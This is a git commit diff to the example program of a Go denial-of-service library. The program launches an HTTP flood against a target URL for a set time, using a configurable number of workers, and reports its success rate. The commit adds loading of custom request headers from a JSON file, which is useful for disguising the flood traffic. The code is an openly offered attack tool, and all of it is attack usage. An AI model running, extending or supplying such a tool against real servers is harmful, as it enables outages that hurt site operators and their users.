8a3a5dd8f62378ec95176c5d53c1107799b4db81
mengyyy <mengyyy@users.noreply.github.com>
2018-04-09 22:31:15 +0800

    Update example.go

--- examples/example.go
+++ examples/example.go
@@ -3,39 +3,49 @@
 package main
 
 import (
-  "time"
-  "log"
-  "flag"
-  ddos "github.com/mengyyy/DDoS"
+	"encoding/json"
+	"flag"
+	ddos "github.com/mengyyy/DDoS"
+	"io/ioutil"
+	"log"
+	"time"
 )
 
 func main() {
 	workers := flag.Int("w", 100, "worker num")
 	targetUrl := flag.String("u", "http://127.0.0.1:80", "target url")
 	workTime := flag.Int("t", 1, "how many  seconds attack keep")
+	jsonConfig := flag.String("hc", "", "headers json congfig file path")
 	flag.Parse()
-	
+
 	log.Println("start ~~~")
 	log.Printf("worker | %d\n", *workers)
 	log.Printf("target | %s", *targetUrl)
 	log.Printf("keep   | %d Seconds\n", *workTime)
-	
-	headers := map[string]string{
-	    "Cache-Control": "no-cache",
-	    "Pragma": "no-cache",
+
+	headers := make(map[string]string)
+	if len(*jsonConfig) > 0 {
+		file, err := ioutil.ReadFile(*jsonConfig)
+		if err != nil {
+			log.Printf("File error: %v\n", err)
+			panic(err)
+		}
+		json.Unmarshal(file, &headers)
+		for k, v := range headers {
+			log.Print(k, v)
+		}
 	}
-	
+
 	d, err := ddos.New(*targetUrl, *workers, headers)
 	if err != nil {
-	    panic(err)
+		panic(err)
 	}
 	d.Run()
 	time.Sleep(time.Duration(*workTime) * time.Second)
 	d.Stop()
 	log.Printf("DDoS attack server: %s\n", *targetUrl)
 	// Output: DDoS attack server: http://127.0.0.1:80
-  successCnt, amount := d.Result()
-  rate := float64(successCnt) / float64(amount) * 100
-  log.Printf("success %d\tamount %d\trate %.2f%%", successCnt, amount, rate)
+	successCnt, amount := d.Result()
+	rate := float64(successCnt) / float64(amount) * 100
+	log.Printf("success %d\tamount %d\trate %.2f%%", successCnt, amount, rate)
 }
-  
